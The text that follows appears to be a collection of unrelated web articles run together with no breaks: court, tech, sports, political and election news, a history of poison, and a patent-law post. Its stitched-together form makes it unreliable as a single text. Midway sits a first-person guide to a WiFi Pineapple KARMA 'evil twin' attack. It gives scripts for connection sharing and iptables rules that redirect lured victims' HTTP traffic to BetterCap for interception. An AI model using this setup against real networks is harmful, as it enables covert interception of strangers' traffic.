According to the filings on Wednesday, the government plans to produce the information it collects from the seized phones to the defendants by way of an electronic database that would be made available to defense counsel. The extracted data includes irrelevant personal information, prosecutors said, so they're seeking an order from the court that would prohibit defense lawyers from copying or sharing information unless it's relevant to defend their client.
A number of defendants filed requests after they were arrested asking the judge to hold a hearing on any requests by the government for search warrants for electronic devices or social media accounts. The judge overseeing all of these cases denied those requests, saying that if defendants believed the government carried out an illegal search, they could ask the court later to suppress information.
Some defendants have also been filing motions to dismiss the charges against them, arguing that the indictments aren't specific enough in tying individuals to particular acts of rioting. Other defendants are arguing that the Justice Department should be disqualified because the protests were against Trump, who is now the head of the executive branch. The government has not yet responded to these motions.
Defendants have been coming to court in groups over the past few weeks for arraignments. Prosecutors on Wednesday proposed formally dividing the defendants into at least four categories for future trials, based on the type of conduct they were accused of, the seriousness of the alleged offenses, and the available evidence that could apply to groups of people.
Christopher Mutimer, a defense lawyer representing one of the defendants, told BuzzFeed News by email on Wednesday that he would oppose efforts by the government to hold joint trials.
"These cases should be tried individually in a manner that protects each individual defendant's constitutional rights," Mutimer said. "Not in groupings that make the trials most convenient for the government. Grouping individuals for trial creates a danger of wrongful convictions based on guilt by association."
Arraignments are scheduled through early April, and then follow-up hearings are set starting in the middle of the month, when the judge is likely to begin addressing any evidence-related issues and motions.

LONDON - A new robotics company aiming to capitalize on the growing trend of automation in the private sector has just raised $17.2 million in investments to develop technology and expand their operation catering to new autonomous shipping and delivery services.
Starship Technologies was founded in 2014 by Ahti Heinla and Janus Friis, two names that may sound familiar for their role as co-founders of the popular video and voice chat service Skype.
"Starship is reinventing the last mile transportation process, allowing convenient and sustainable robotic delivery," said the CEO Ahti Heinla, CEO of Starship Technologies, in a statement.
The robots in question, which have been referred to as "ground drones", are small, six-wheeled cuboid vehicles, capable of carrying up to 20lbs in an on-board compartment to be delivered to local customers.
The drones are constantly connected to the internet via wifi, which they use to send and transmit data about their location, as well as to find the customer's location, and are completely self-driven, using technology similar to that being developed for driverless cars, including an on-board camera and sensor suite that detects obstacles and pedestrians.
They can travel at around 4mph along the sidewalk, and are even capable of crossing the street at crosswalks, being mindful of the traffic around them.
To err on the side of caution, the drones can be monitored by human operators, who can take control at any time, but for the most part, will operate fully automatically.
The drones have already been tested in pilot programs in 59 cities, including New York and London, where a takeaway food delivery service called Just Eat is already using the robots to deliver meals to their customers.
Starship Technologies claims that their drones have collectively travelled more than 16,000 miles and interacted with more than 3.1 million people, including pedestrians and customers.
"In the not too distant future, this will just be commonplace. Robots are doing more and more and becoming a larger part of our lives every day" said one employee who works as a delivery person himself. When asked if he was worried his job might become obsolete any time soon, he replied "no comment."

I began contributing to Ethereum's proof of stake protocol Casper last March, while continuing my work at ConsenSys. I have been working directly with Ethereum Foundation researchers, such as Vitalik and Vlad, on Casper's implementation. This has enabled me to dive deeply into Ethereum, consensus protocols, and cryptoeconomics.
Every few weeks ConsenSys holds a company-wide Developer Roundtable. During these roundtables, developers present recent works, useful techniques, and informative topics. Two weeks ago, I gave a presentation on Casper and related concepts based on three years of research done by the Casper research team. The topics included were: An overview of Casper, economic finality, miner censorship, fork choice, usage of smart contracts for consensus, and more. Above is a recording of that developer roundtable session. Hope you enjoy!

The history of poison[1] stretches from before 4500 BC to the present day. Poisons have been used for many purposes across the span of human existence, most commonly as weapons, anti-venoms, and medicines. Poison has allowed much progress in branches, toxicology, and technology, among other sciences.
Poison was discovered in ancient times, and was used by ancient tribes and civilizations as a hunting tool to quicken and ensure the death of their prey or enemies. This use of poison grew more advanced, and many of these ancient peoples began forging weapons designed specifically for poison enhancement. Later in history, particularly at the time of the Roman Empire, one of the more prevalent uses was assassination. As early as 331 BC, poisonings executed at the dinner table or in drinks were reported, and the practice became a common occurrence. The use of fatal substances was seen among every social class; even the nobility would often use it to dispose of unwanted political or economic opponents.
In Medieval Europe, poison became a more popular form of killing, though cures surfaced for many of the more widely known poisons. This was stimulated by the increased availability of poisons; shops known as apothecaries, selling various medicinal wares, were open to the public, and from there, substances that were traditionally used for curative purposes were employed for more sinister ends. At approximately the same time, in the Middle East, Arabs developed a form of arsenic that is odorless and transparent, making the poison difficult to detect. This "poison epidemic" was also prevalent in parts of Asia at this time, as well.
Over the centuries, the variety of harmful uses of poisons continued to increase. The means for curing these poisons also advanced in parallel. In the modern world, intentional poisoning is less common than the Middle Ages. Rather, the more common concern is the risk of accidental poisoning from everyday substances and products.
Constructive uses for poisons have increased considerably in the modern world. Poisons are now used as pesticides, disinfectants, cleaning solutions, and preservatives. Nonetheless, poison continues to be used as a hunting tool in remote parts of developing countries, including Africa, South America, and Asia.
Origins of poison [ edit ]
Strychnos toxifera, a plant used for the making of dart and arrow poisons , a plant used for the making of dart and arrow poisons
Archaeological findings prove that while ancient mankind used conventional weapons such as axes and clubs, and later swords, they sought more subtle, destructive means of causing death—something that could be achieved through poison.[2] Grooves for storing or holding poisons such as tubocurarine have been plainly found in their hunting weapons and tools, showing that early humans had discovered poisons of varying potency and applied them to their weapons.[2] Some speculate that this use and existence of these strange and noxious substances was kept secret within the more important and higher-ranked members of a tribe or clan, and were seen as emblems of a greater power. This may have also given birth to the concept of the stereotypical "medicine man" or "witch doctor".[2]
Once the use and danger of poison was realized, it became apparent that something had to be done. Mithridates VI, King of Pontus (an ancient Hellenistic state of northern Anatolia), from around 114–63 BC, lived in constant fear of being assassinated through poison. He became a hard-working pioneer in the search for a cure for poisons.[2] In his position of power, he was able to test poisons on criminals facing execution, and then if there was a possible antidote. He was paranoid to the point that he administered daily amounts of poisons in an attempt to make himself immune to as many poisons as he could.[2] Eventually, he discovered a formula that combined small portions of dozens of the best-known herbal remedies of the time, which he named Mithridatium.[2] This was kept secret until his kingdom was invaded by Pompey the Great, who took it back to Rome. After being defeated by Pompey, Mithridates' antidote prescriptions and notes of medicinal plants were taken by the Romans and translated into Latin.[3]
Pliny the Elder describes over 7000 different poisons. One he describes as "The blood of a duck found in a certain district of Pontus, which was supposed to live on poisonous food, and the blood of this duck was afterwards used in the preparation of the Mithridatum, because it fed on poisonous plants and suffered no harm."[2]
India [ edit ]
Indian surgeon Sushruta defined the stages of slow poisoning and the remedies of slow poisoning. He also mentions antidotes and the use of traditional substances to counter the effects of poisoning.[4]
Poisoned weapons were used in ancient India,[5] and war tactics in ancient India have references to poison. A verse in Sanskrit reads "Jalam visravayet sarmavamavisravyam ca dusayet," which translates to "Waters of wells were to be mixed with poison and thus polluted."[5]
Chānakya (c. 350–283 BC), also known as Kautilya, was adviser and prime minister[6] to the first Maurya Emperor Chandragupta (c. 340–293 BC). Kautilya suggested employing means such as seduction, secret use of weapons, and poison for political gain.[7] He also urged detailed precautions against assassination—tasters for food and elaborate ways to detect poison.[8] In addition, the death penalty for violations of royal decrees was frequently administered through the use of poison.[9]

Egypt [ edit ]
Unlike many civilizations, records of Egyptian knowledge and use of poisons can only be dated back to approximately 300 BC. However, it is believed that the earliest known Egyptian pharaoh, Menes, studied the properties of poisonous plants and venoms, according to early records.[2]
The Egyptians are also thought to have come into knowledge about elements such as antimony, copper, crude arsenic, lead, opium, and mandrake (among others) which are mentioned in papyri. Egyptians are now thought to be the first to master distillation, and to manipulate the poison that can be retrieved from apricot kernels.[2]
Cleopatra is said to have poisoned herself with an asp after hearing of Marc Antony's demise. Prior to her death, she was said to have sent many of her maidservants to act as guinea pigs to test different poisons, including belladonna, henbane, and the strychnine tree's seed.[10]
After this, the alchemist Agathodaemon (around AD 300) spoke of a mineral that when mixed with natron produced a 'fiery poison'. He described this poison as 'disappearing in water', giving a clear solution.[11] Emsley speculates that the 'fiery poison' was arsenic trioxide, the unidentified mineral having to have been either realgar or orpiment, due to the relation between the unidentified mineral and his other writings.[11]
Rome [ edit ]
A bust of the Roman Emperor Nero, who used cyanide to dispose of unwanted family members
In Roman times, poisoning carried out at the dinner table or common eating or drinking area was not unheard of, or even uncommon, and was happening as early as 331 BC.[2] These poisonings would have been used for self-advantageous reasons in every class of the social order. The writer Livy describes the poisoning of members of the upper class and nobles of Rome, and Roman emperor Nero is known to have favored the use of poisons on his relatives, even hiring a personal poisoner. His preferred enema poison was said to be cyanide.[2]
Nero's predecessor, Claudius, was allegedly poisoned with mushrooms or alternatively poison herbs.[12] However, accounts of the way Claudius died vary greatly. Halotus, his taster, Gaius Stertinius Xenophon, his doctor, and the infamous poisoner Locusta have all been accused of possibly being the administrator of the fatal substance, but Agrippina, his final wife, is considered to be the most likely to have arranged his murder and may have even administered the poison herself. Some report that he died after prolonged suffering following a single dose at his evening meal, while some say that he recovered somewhat, only to be poisoned once more by a feather dipped in poison which was pushed down his throat under the pretense of helping him to vomit,[13] or by poisoned gruel or an enema.[12] Agrippina is considered to be the murderer, because she was ambitious for her son, Nero, and Claudius had become suspicious of her intrigues.[14]
Later imperial Asia [ edit ]
Despite the negative effects of poison, which were so evident in these times, cures were being found in poison, even at such a time where it was hated by the most of the general public. An example can be found in the works of Iranian born Persian physician, philosopher, and scholar Rhazes, writer of Secret of Secrets, which was a long list of chemical compounds, minerals and apparatus, the first man to distil alcohol and use it as an anti-septic, and the person who suggested mercury be used as a laxative. He made discoveries relating to a mercury chloride called corrosive sublimate. An ointment derived from this sublimate was used to cure what Rhazes described as 'the itch', which is now referred to as scabies. This proved an effective treatment because of mercury's poisonous nature and ability to penetrate the skin, allowing it to eliminate the disease and the itch.[15]
Nazi suicides by poison [ edit ]
Nazi war leader Hermann Göring used cyanide to kill himself the night before he was supposed to be hanged during the Nuremberg Trials.[16] Adolf Hitler had also taken a pill of cyanide but he bit down on the capsule and shot himself in the right temple shortly before the fall of Berlin along with his wife, Eva Braun.[17]
Present day [ edit ]
In the late 20th century, an increasing number of products used for everyday life proved to be poisonous. The risk of being poisoned nowadays lies more in the accidental factor, where poison be induced or taken by accident. Poisoning is the 4th most common cause of death within young people. Accidental ingestions are most common in children less than 5 years old.
However, hospital and emergency facilities are much enhanced compared to the first half of the 20th century and before, and antidotes are more available. Antidotes have been found for many poisons, and the antidotes for some of the most commonly known poisons are shown in the table above:
However, poison still exists as a murderous entity today, but it is not as popular form of conducting murder as it used to be in past times, probably because of the wider range of ways to kill people and other factors that must be taken into consideration. One of the more recent deaths by poisoning was that of Russian dissident Alexander Litvinenko in 2006 from lethal polonium-210 radiation poisoning.[22]
Other uses [ edit ]
Today, poison is used for a wider variety of purposes than it used to be. For example, poison can be used to rid an unwanted infestation by pests or to kill weeds. Such chemicals, known as pesticides,[23] have been known to be used in some form since about 2500 BC. However, the use of pesticides has increased staggeringly from 1950, and presently approximately 2.5 million tons of industrial pesticides are used each year.[24] Other poisons can also be used to preserve foods and building material.
In culture [ edit ]
Today, in many developing peoples of countries such as certain parts of Africa, South America and Asia, the use of poison as an actual weapon of hunting and attack still endures.
In Africa, certain arrow poisons are made using floral ingredients, such as of that taken from the plant Acokanthera. This plant contains ouabain, which is a cardiac glycoside, oleander, and milkweeds.[25] Poisoned arrows are also still used in the jungle areas of Assam, Burma and Malaysia. The ingredients for the creation of these poisons are mainly extracted from plants of the Antiaris, Strychnos and Strophanthus genera, and Antiaris toxicaria (a tree of the mulberry and breadfruit family), for example, is used in the Java island of Indonesia, as well as several of its surrounding islands. The juice or liquid extracts are smeared on the head of the arrow, and inflicts the target paralysis, convulsions and/or cardiac arrest, virtually on strike due to the speed in which the extracts can affect a victim.[26]
As well as plant based poisons, there are others that are made that are based on animals. For example, the larva or pupae of a beetle genus of the Northern Kalahari Desert is used to create a slow-acting poison that can be quite useful when hunting. The beetle itself is applied to the arrow head, by squeezing the contents of the beetle right onto the head. Plant sap is then mixed and serves as an adhesive. However, instead of the plant sap, a powder made from the dead, eviscerated larva can be used.[27]

The league's former practice of allowing players to return when their concussion symptoms subside has been criticized for putting its players at risk. It is widely known that symptoms of a concussion can reappear hours or days after the injury, indicating that the player had not healed from the initial blow.
The culture of playing through brain injuries in the N.F.L. has also influenced younger players, for whom repeat concussions can be serious. Because the governing bodies at the college and high school levels do not have rules regarding concussion management, amateur players routinely return after concussions, even if they are evaluated by a doctor or athletic trainer.
The new rule, which will take effect in this week's games, still allows players with some fleeting concussion symptoms to return to games.
Symptoms that require immediate removal include amnesia , poor balance and an abnormal neurological examination, whether or not those symptoms quickly subside. For symptoms like dizziness and headache , however, a player can return to the field unless they are “persistent,” the statement said.
“There has to be some discretion for medical professionals,” Dr. Maroon said. “There's a difference between a fever of 99 that goes away and a fever of 105. I don't think we're going to take the occasional minor fever out of football. On every play there are traumatic experiences to the head. The question is one of degree.”

Dr. Elliot Pellman, a member of the league's committee on concussions and the primary author of several published studies that defended the league's more liberal return-to-play protocol, declined to comment on Wednesday's rule change.
Disqualifying players with any significant concussion symptoms could backfire, experts have said. Players have been known to hide their symptoms from medical personnel to stay on the field, and knowing they will have no chance to return could only discourage them further.

In Wednesday's statement, N.F.L. Commissioner Roger Goodell reasserted the players' growing responsibility for concussion care.

“A critical element of managing concussions is candid reporting by players of their symptoms following an injury,” Mr. Goodell said. “Accordingly, players are to be encouraged to be candid with team medical staffs and fully disclose any signs or symptoms that may be associated with a concussion.”
In September, The New York Times obtained the results of a league-sponsored telephone survey that indicated that N.F.L. retirees were reporting diagnoses of dementia and other memory-related diseases at several times the rate in the national population. The finding corroborated several other studies that the league had disparaged, prompting the House Judiciary Committee to hold a hearing on football brain injuries on Oct. 28 in which Mr. Goodell and the players union were criticized on the issue.
Beyond Roethlisberger and Warner, the running backs Clinton Portis of the Washington Redskins and Brian Westbrook of the Philadelphia Eagles have dealt with concussions in recent weeks, stoking the scrutiny of the league's policies. Westbrook's teammate DeSean Jackson sustained a concussion last week and may not play this weekend.
Dr. Thom Mayer, medical director of the players union, said that all independent experts who will work the sideline of every game have been identified and approved by him and Dr. Pellman. He added that there are four finalists to become the new chairman, all of whom have academic backgrounds with no prior connection to the N.F.L.
Wednesday's rule change contradicts past recommendations by the N.F.L.'s committee. A paper published in the journal Neurosurgery in 2005 — whose lead authors were Dr. Pellman and the co-chairmen who recently resigned, David Viano and Ira Casson — defended as safe the league's practice of returning players after concussions.
“Players who are concussed and return to the same game have fewer initial signs and symptoms than those removed from play,” the paper said. “Return to play does not involve a significant risk of a second injury either in the same game or during the season. The current decision-making of N.F.L. team physicians seems appropriate for return to the game after a concussion, when the player has become asymptomatic and does not have memory or cognitive problems.”
Despite criticism by experts that returning to play on the same day as a concussion was dangerous, dozens of N.F.L. players have done so.
Starting this week, they no longer will.
Dr. Maroon called the rule “another progressive step for the league in terms of player safety.” Asked why the league did not adopt the rule three years ago, when outside experts were calling for it, he said: “You can ask a lot of good questions. The important thing is it's being done now.”
German Communist Party (DKP) released a statement on the decision of the Federal Constitutional Court to ban NPD.
ICP, 20 January 2017
The chairman of the German Communist Party (DKP), Patrik Köbele, made a statement on the decision of the Federal Constitutional Court to ban the fascist party NPD. In his statement, Köbele questioned bourgeois democracy and the rule of law against fascism.
The statement went as follows:
"What means the 'militant democracy' of which those who defend this state and the existing rule of capital talk? The constitutional court's decision shows what it does not mean: The NPD, an aggressive, racist, fascist party will not be banned. Of course, according to the law this would have been possible – article 139 of the Federal Basic Law means that fascist organizations are banned.
This bourgeois democracy is always 'militant' when the government considers it necessary to keep leftists and especially communists under surveillance, to purge them from public services, to ban their organizations. The Communist Party of Germany (KPD) is still banned, the Berufsverbote* against communists have not been terminated.
DKP still demands to ban NPD and all fascist organizations. A ban would weaken the fascists: It would make it more difficult for them to propagate their racist hatred, they could not pocket tax money any more. The verdict from the Federal Constitutional Court in Karlsruhe on NPD just shows once again: To struggle against fascists does also mean to struggle against the secret service. In this struggle, we cannot rely on the judges of this country.”
*"Berufsverbot" is a rule in German law ordering professional disqualification. It was first applied in 1933 under Nazi power against Jews, artists and political opponents from engaging in certain professions. This law of prohibition was applied in 1972 in West German under the name of "Radikalenerlass" (Anti-Radical Decree) to prevent citizens with "radical" ideas from entering certain public services. After the dissolution of German Democratic Republic the same rule was used against members of the German Communist Party.

McMullin has been an outspoken critic of Trump since the election, while the president-elect has frequently called him “some guy” who was trying to beat him in Utah.
On Friday night, however, Trump called him "McMuffin" after an audience member shouted it at the rally.
"That's correct, that's his name, he said Evan McMuffin, do you believe this?” Trump said. “I never heard of this guy before. Nobody did. And the polls said he's even with Donald Trump. My wife said, she looked at the television and she said he's not even with you. Believe me, he's not even.”

CHICAGO (CBS) — The Bears' loss to the Packers on Thursday not only cost them the momentum they had created with their season opening win over the Colts, it might have cost them the services of running back Matt Forte for a bit.
Although the team has not yet said whether Forte will miss any time from his ankle injury, coach Lovie Smith told WBBM Newsradio's Josh Liss Monday morning that Forte does not have a high ankle sprain.
“Matt did go down with an ankle injury. It's not a high ankle sprain, as has been reported,” Smith said. “He still has some soreness. We'll continue to monitor it, but we felt like we needed another running back here, so we brought back a guy that knows our system and has played good ball for us in Kahlil Bell.”
Backup Michael Bush took over as the running back after Forte went down on Thursday, and would likely start Sunday's game against the Rams if Forte is unable to play.
Smith declined to discuss the 23-10 loss to the Packers, or quarterback Jay Cutler's actions on the field — when he was seen yelling at members of the offensive line, and giving a shoulder bump to left tackle J'Marcus Webb. Cutler was sacked seven times and threw four interceptions against Green Bay.
“We've moved on from the last game. We didn't play as well as we needed to. We didn't handle some situations as we needed to. We like our football team. Things happen inside,” Smith said. “But that happens sometimes, and you move on. We don't have any major issues except for we lost a football game and can't wait for the team to get back on the field this week”
Smith said the team has to move on from the loss to the Packers and focus on the next game against the Rams, who are 1-1 after a 31-28 comeback win against the Redskins.
“Their win was about as impressive as any of the wins this past weekend,” Smith said of the Rams' rally from a 15-point deficit. “Not only that one, but they had a chance to also beat the Lions the week before. Just played good in all three phases, and it'll be a heck of a challenge for us this week.”
With Brandon Austin's commitment last night, Chambers has forced my hand at some recruiting coverage I was hoping to push out immediately after this season. Although most of us have already seen the waves Chambers has made in the recruiting realm, there was still skepticism until that first big time recruit actually made the call. Geno Thorpe had impressive offers but was still rated a fringe Top 100 player at best like Taran Buie. To be fair to Buie, he was ranked similarly to where Austin is now when he committed, but then he fell down the rankings. Judging by his offers, Brandon Austin appears to be that first true 4-star prospect who spurned the big boys of the Big East to come to PSU.
Chambers has landed 5 players since he was hired in June, and it seems each new one is bigger than the last. Momentum is so big on the recruiting trail, and there's no question PSU is gaining steam in PA right now, Philadelphia in particular. However, PSU can't hand out many more scholarship offers unless others open up. All of that will play out over the next year, but if I had to guess, I'd say PSU ends up with a four-man class in 2013.
If that indeed becomes the case, I'd expect those four guys to form PSU's first ever nationally ranked recruiting class. Why? As the Recruit Scoop hinted, there are more big names on the way, likely AAU teammates or friends of the current commitments from the Philly/NJ area. Austin said it himself to David Jones that DJ Newbill, Brandon Taylor, and Geno Thorpe all helped lure him to State College. All these players know who's who in Philly basketball (and nearby NJ). It also helps even more when some of them play for the same AAU program (Team Philly). All of these guys will have a great family vibe going before they even step on campus and will likely continue to spread the word about Penn State basketball all through the area.
Penn State is now a viable basketball option for any Philadelphia basketball player.
The buzz around this program right now grabs the attention of other big time recruits looking at Penn State. It also gives PSU great momentum to get started on the 2014 class this offseason. The big news has already left a favorable impression on 2014 SF Jahyde Gardiner, another Team Philly disciple.
There's no doubt the excitement around this program is reaching unchartered grounds, but it's important to put this in perspective. While these are new heights for Penn State in recruiting, this doesn't make much of a ripple in the Big Ten. For instance, this conference already has 5 of the current top 10 2013 recruiting classes, as ranked by Scout. Not all of those classes will stay there at the end of the day, but there are a lot of great recruiters in this conference. Five Top 25 2012 classes are coming in next year too (UM, MSU, Iowa, PU, and IU), while Illinois, OSU, and Wisconsin will never be short on talent. There's still plenty of work that needs to be done to reach comparable levels to their Big Ten brethren.
The good news is Chambers has us in a position to reach those levels. Next up for PSU in the immediate future is 2012 6'7" wing Sheldon Jeter from Pittsburgh. Jeter is a late-bloomer who was under-the-radar on the AAU circuit this past year but has really grown into a high-D1 prospect. Many have cited his improved defense to compliment his explosive offensive game as the reason he's receiving bigger interest. Wisconsin and South Carolina have offered him scholarships, while Pittsburgh has been on the verge of offering the last few weeks. Penn State sits in a great position for Jeter (Thorpe has been recruiting him, too), but the Pittsburgh offer could be the x-factor.
As far as 2013 prospects, PSU is still in the running for many of the top ones. Here's a list of former campus visitors from the past summer / fall.
PSU is in better position for some of these guys than others. My personal favorite is Kris Jenkins, who seems to be a slightly taller (though still short) Jamelle Cornley with a lethal jump shot. He has been killing it for Gonzaga HS in DC (Keith Urgo's old school) and is quickly rising up the rankings. I haven't heard too much recently from the big men listed (other than Rimmer), but I know Williams is a long shot. Farmer has most of the Big Ten on him, but he is the HS teammate of Trey Lewis.
It all comes back to the Recruit Scoop's tease at the end of his article about Brandon Austin. Arguably the most connected recruitnik on the East Coast had this to say:
As the new Nittany Lions staff continues to restore the roar at Penn State, look for another big name to commit to the program in the coming months.
Kline, who lives in New Jersey, is well connected to Davon Reed and Jaren Sina. They both are playing in Kline's annual classic (that honors his mom who died of cancer, great story by the way).
While the season is in a bit of lull right now, the possibilities on the recruiting trail are very exciting. It's going to be a fun offseason. #doworkPat

HYDERABAD: BJP MP Varun Gandhi on Friday termed the Election Commission as a "toothless tiger" which, he said, has never derecognised any political party for not submitting poll expenditure details within the stipulated time.Gandhi also said political parties spend a lot on poll campaign, denying opportunity to people from humble background to contest elections.His remarks come even as the BJP is under opposition attack for "pressuring" the Election Commission to not declare elections to the Gujarat Assembly with those for Himachal Pradesh legislature. The Congress has accused the BJP of using "shameless pressure tactics" with the EC so it could woo the voters in Gujarat with last-minute sops."One of the biggest problems is the problem of the Election Commission which is really a toothless tiger. Article 324 of the Constitution says it (EC) controls and supervises elections. But does it really do that?"It does not have the power to file cases once elections are over. It has to go to the Supreme Court to do so," Varun Gandhi said while delivering a lecture on "Political Reforms in India" at the NALSAR University of Law here.He said the poll panel has never derecognised any political party for not filing the poll expenditure report on time."Though all political parties file late returns, only one political party belonging to the late PA Sangma (NPP) was derecognised for not filing returns on time, and the commission revoked the same a day after it filed the expenditure report," said Gandhi who represents Sultanpur seat in Uttar Pradesh.He said the budget allocated for the poll panel for the 2014 Lok Sabha election stood at Rs 594 crore while there are 814 million voters in the country.In contrast, the budget was double in Sweden which has a voter base of seven million, he said.Gandhi acknowledged the excessive influence of money power in the electoral system and cited some examples.He said it has become virtually impossible for people from poor and middle class background to contest elections to Parliament and state assemblies.Noting that political parties spend large amounts of money on poll campaign, the BJP leader said, "Technically, an MLA (candidate) can spend between Rs 20 and Rs 28 lakh and an MP (aspirant) Rs 54-Rs 70 lakh. But you are not told that political parties spend unlimited amounts on elections...It is a skewed form of political expenditure which ensures that no middle class or poor people can fight elections anymore".He expressed confidence that political parties will inevitably move towards transparency."....It may take five years...It may take 10 years...I am very optimistic," Gandhi added.
After a few weeks of testing on the field, I've found the perfect configuration for WiFi pentesting using a WiFi Pineapple NANO, an OSX laptop and BetterCap.
Since different people from different forums had issues making this work ( mostly due to the difficulties of internet connection sharing between OSX and the Pineapple ) I've decided to share my setup today ^_^
WiFi Pineapple AKA KARMA attack for the masses
First of all, let's talk a little bit about the KARMA attack in case you have no idea what I'm talking about. DigiNinja page on karma says:
Karma is a set of patches to access point software to get it to respond to probe requests not just for itself but for any ESSID requested. This allows the AP to act as a lure to draw in any clients probing for known networks. The original Karma patches were released by Dino Dai Zovi for Madwifi, I then took over and ported the patches to Madwifi-ng and have now taken them to the new hostapd.
Long story short, on each WiFi access point there's a demon running called hostapd which receives probes from nearby clients ( your laptop, mobile, etc ) and only responds to the probes that were sent to its SSID, discarding everything else.
Someone created a patched version of the hostapd binary which instead accepts every probe, this results in a WiFi access point that pretends to be (for instance) your home network thus forcing nearby devices to automatically connect to it.
You can create such kind of “Evil Twin” AP using a Kali distribution, the right drivers, the right hardware and so forth, or you can also hack a cheap TPLink WR703N, but the easiest, quickest (and IMHO more stable) solution is buying a WiFi Pineapple from Hak5 online shop.
In my case, I have a MKV, a Tetra and a NANO, in this post I'll talk about the latter.
Internet Connection Sharing with OS X
Once you've done with the basic NANO configuration, you'll have your device up and running with the ip address 172.16.42.1, in order to share the connection from your Mac wifi adapter to the NANO ( which is plugged to the Mac's USB port at this point ) you'll need to change this ip address to a different one which eventually will be “accepted” by the ICS OS X mechanism, so:
ssh [email protected] uci set network.lan.ipaddr='192.168.2.10' uci set network.lan.gateway='192.168.2.1' uci commit && reboot
You'll then enable internet connection sharing from your Mac WiFi adapter to the NANO USB-Eth adapter:
And eventually you'll need to configure a static ip address for the interface:
Almost done, you need to apply the correct firewall rules on your Mac to make everything work between the two interfaces, this is a bash script I've made ( in my case the NANO ethernet interface is en4, change it to your needs ):
#!/bin/bash if [ "$(id -u)" != "0" ]; then echo "This script must be run as root." 1>&2 exit 1 fi sysctl -w net.inet.ip.forwarding=1 pfctl -e echo "nat on en0 from en4:network to any -> (en0)" | pfctl -f -
Once you've launched it, you can ssh again into your NANO and verify that the connection sharing is actually working.
Last step, just configure and start PineAP as you normally would:
You now have your KARMA attack running and nearby WiFi enabled devices should start connecting to your evil AP very soon :)
Port Redirection and BetterCap
Unfortunately making bettercap run on the NANO is a pain in the ass and, even if you manage to do it, its hardware is simply not powerful enough to properly running it while handling multiple connections, so I've decided to run it on the laptop and have the NANO redirect all HTTP (and optionally HTTPS) traffic to it.
Here's a simple bash script that you need to copy to your NANO, it will enable or disable port redirection to your bettercap instance running on the laptop:
#!/bin/bash if [[ $# -eq 0 ]] ; then echo "Usage: $0 (enable|disable)" exit 1 fi action="$1" case $action in enable) echo "Enabling ..." iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $(uci get network.lan.gateway):8080 iptables -t nat -A POSTROUTING -j MASQUERADE ;; disable) echo "Disabling ..." iptables -t nat -D PREROUTING -p tcp --dport 80 -j DNAT --to-destination $(uci get network.lan.gateway):8080 ;; *) echo "Usage: $0 (enable|disable)" exit 1 ;; esac
Once you've enabled port redirection, you can simply start bettercap on your laptop with your preferred command line and start intercepting the traffic of the target clients that have been forced to connect to your evil access point :D
DONE! :D You won't even need to MITM something, with this attack the targets will connect to you … enjoy! :)
This week, the Supreme Court put to rest any doubt that when it invalidated a patent that added nothing novel to an otherwise unpatentable idea back in March, it was talking about software patents, too. In that case, Mayo v. Prometheus, the Court reviewed the three types of inventions that cannot be patented: laws of nature, natural phenomena, and abstract ideas and held that the patent at issue there—one covering diagnostic testing—represented nothing more than a law of nature, with “conventional steps, specified at a high level of generality,” appended. At the time, we commented that this ruling should likewise apply to software patents, so that merely adding a "conventional step" to an otherwise abstract idea would not make that abstract idea patentable (which is exactly what happened in the Ultramercial v. Hulu case). On Monday, the Supreme Court told the Federal Circuit to reconsider its Ultramercial ruling in light of Mayo, which sounds a lot like an endorsement that Mayo's limitations on patentable subject matter should extend to software, too.
When Mayo was first decided, we were pleased to see that the Supreme Court's language included abstract ideas in its analysis. Of course, many consider most software, and the algorithms that form its basis, abstract ideas that should not be patented. So you can see why the Mayo ruling, applied to abstract ideas, would have the potential to limit some of the worst software patents we've seen.
Case in point: Ultramercial. We've written about this dangerous ruling before (here and here), but, in case you missed it, there the Federal Circuit upheld a patent that merely claimed a process for doing no more than viewing ads online before accessing copyrighted content. The court claimed that the patent was not abstract because the steps were completed on the Internet, despite the fact that the underlying idea—viewing ads in exchange for content—was indeed abstract. Essentially, if more courts and the Patent Office follow Ultramercial, the mere act of performing an abstract idea on the Internet would somehow make that otherwise abstract idea no longer abstract. Given the myriad ways in which the world is moving online, you can see just how badly this could go.
Lately, many have argued about whether the Mayo ruling would apply to software, too. We think it clearly should, and does. It seems the Supreme Court thinks so, too. We hope the Federal Circuit will get it right this time and strike Ultramercial from the books.

The schedule was announced by Chief Election Commissioner V S Sampath along with Election Commissioners H S Brahma and Dr Nasim Zaidi at a press conference held at Vigyan Bhavan in the national capital.
The elections would see more than 81.4 crore voters exercise their ballot; the number of voters is 10 crore more than the last general election held in 2009. The term of the current Lok Sabha expires on June 1 and the new House has to be constituted by May 31.
Sampath said that the EC had taken into consideration factors like examination schedules and weather conditions.
The EC said that electoral roll have already been updated till January 1, 2014 and final rolls have been published in all states.
However, the EC has offered one more opportunity to enroll in the electoral rolls. Camps would be set up on March 9 at all polling booths – around 9,30,000 - across the country to allow people to enroll themselves, the EC said.

The Model Code of Conduct for governments and political parties will come into force with immediate effect.
On the security measures being implemented by the EC, Sampath said, “To ensure free and fair elections we have taken particular care to ensure that people living in vulnerable areas and vulnerable voters are in continuous touch with the election machinery to ensure that they are able to vote uninterpreted by anyone.”
“Adequate number of observers in different categories will be deployed during the forthcoming elections,” he added.
On the neutrality of officials engaged in conduct of elections, Sampath said the EC expects them to discharge their duty without fear or favour.
“Strict action will be taken against officials who are found wanting in any aspect,” the CEC said.
With regards to the steps being taken to curb use of money power in the elections, he said, “The Election Commission has mounted a series of measures for monitoring expenditure; special emphasis is given to check flow of money during elections.”
“Besides expenditure observers, sufficient number of flying squads will be employed to check use of money power,” he added.
In response to a query by Zee Media, Election Commissioner HS Brahma said, “Appeal to all candidates,star candidates,they should not use any words which is against decorum & decency.”
An important feature of the polls would be the introduction of paper trail system for electronic voting in some constituencies on a trial basis.
Also, the EC has issued guidelines to political parties asking them to explain the rationale of financing the promises they make in their election manifestos. The guidelines that followed Supreme Court directions in this regard have now been made part of the Model Code.
Another first in the Lok Sabha elections will be the introduction of "None of the Above" (NOTA) option in voting, which came into vogue in the assembly elections a few months ago.
From the coming elections, candidates in a parliamentary constituency in bigger states can spend up to Rs 70 lakh on their campaign, up from Rs 40 lakh in 2011. In the 2009 elections, it was Rs 25 lakh.

SAN ANTONIO — Authorities on Monday scoured an area in Wilson County as part of the ongoing search for Patty Vaughan, who was last seen on Christmas in 1996.
The search was being led by the Texas Rangers, with assistance from the FBI, officials said.
